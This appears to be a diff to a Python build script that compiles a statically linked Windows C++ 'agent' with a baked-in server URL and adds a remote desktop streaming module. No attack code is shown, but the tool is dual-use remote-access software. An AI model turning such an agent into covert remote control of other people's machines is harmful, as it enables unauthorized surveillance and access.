@@ -21,7 +21,9 @@ CPP_AGENT_DIR = PROJECT_ROOT / "builder_cpp" / "agent"
 DIST_DIR = PROJECT_ROOT / "dist" / "agents"
 DIST_DIR.mkdir(parents=True, exist_ok=True)
 
+# Main agent + RemoteDesktopStreamer module
 CPP_ENTRYPOINT = CPP_AGENT_DIR / "cmd" / "agent" / "main.cpp"
+CPP_RDS_MODULE = CPP_AGENT_DIR / "cmd" / "agent" / "RemoteDesktopStreamer.cpp"
 GOOS = "windows"
 GOARCH = "amd64"
 
@@ -49,7 +51,7 @@ def sha256_file(path: Path) -> str:
     return h.hexdigest()
 
 
-def build_exe(build_slug: str, server_url: str) -> Path:
+def build_exe(build_slug: str, server_url: str, agent_id: str = "agent1") -> Path:
     output_exe = DIST_DIR / f"agent_universal_{build_slug}.exe"
 
     print(f"[+] Building {output_exe.name}")
@@ -57,14 +59,22 @@ def build_exe(build_slug: str, server_url: str) -> Path:
     # Вшиваем параметры в исполняемый файл через макросы компилятора
     cmd = [
         GXX,
-        "-o", str(output_exe),
+        "-o",
+        str(output_exe),
         f'-DSERVER_URL=\\"{server_url}\\"',
         f'-DBUILD_SLUG=\\"{build_slug}\\"',
+        f'-DAGENT_ID=\\"{agent_id}\\"',
         str(CPP_ENTRYPOINT),
+        str(CPP_RDS_MODULE),
         "-lwinhttp",
         "-lws2_32",
         "-ladvapi32",
+        "-lsecur32",
+        "-lcrypt32",
+        "-luser32",
         "-static",
+        "-static-libgcc",
+        "-static-libstdc++",
     ]
 
     print(f"[+] Running: {' '.join(cmd)}")
@@ -93,7 +103,8 @@ async def build_agent() -> None:
         print(f"[i] New build slug: {new_build_slug}")
 
         server_url = str(settings.APP_HOST)
-        exe_path = build_exe(new_build_slug, server_url)
+        agent_id = "agent_universal"  # Default agent ID
+        exe_path = build_exe(new_build_slug, server_url, agent_id)
 
         sha256 = sha256_file(exe_path)
         print(f"[i] SHA256: {sha256}")
@@ -108,7 +119,10 @@ async def build_agent() -> None:
 
         await activate_build(session, build.id)
 
-        print(f"[+] Universal agent built: {exe_path.name}")
+        print(f"[+] Unified agent built: {exe_path.name}")
+        print(f"[i] Build slug: {new_build_slug}")
+        print(f"[i] Agent ID: {agent_id}")
+        print(f"[i] Server URL: {server_url}")
 
 
 if __name__ == "__main__":
